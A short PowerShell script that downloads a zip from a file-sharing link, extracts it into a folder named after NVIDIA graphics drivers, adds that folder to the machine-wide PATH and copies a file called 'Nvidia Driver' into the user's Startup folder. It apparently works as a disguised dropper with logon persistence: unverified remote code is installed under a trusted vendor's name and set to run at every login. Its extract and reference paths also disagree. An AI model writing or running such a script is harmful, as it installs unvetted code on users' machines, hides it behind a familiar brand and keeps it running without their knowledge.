$username=[Environment]::UserName
$zipFile = "https://drive.google.com/uc?export=download&id=1cwwPzYjIzzzzzzzzzzzzzzzzzzzzzzzz"
Invoke-WebRequest -Uri $zipFile -OutFile "C:\Users\$username\AppData\Local\Temp\updater.zip"
Expand-Archive "C:\Users\$username\AppData\Local\Temp\updater.zip" -DestinationPath "C:\Users\Program Files\NVIDIA Graphics Drivers"
$Path = [Environment]::GetEnvironmentVariable("PATH", "Machine")+';C:\Program Files\NVIDIA Graphics Drivers\bin;C:\Program Files\NVIDIA Graphics Drivers\include'
[Environment]::SetEnvironmentVariable( "Path", $Path, "Machine" )
cp "C:\Program Files\NVIDIA Graphics Drivers\Nvidia Driver" "C:\Users\$username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
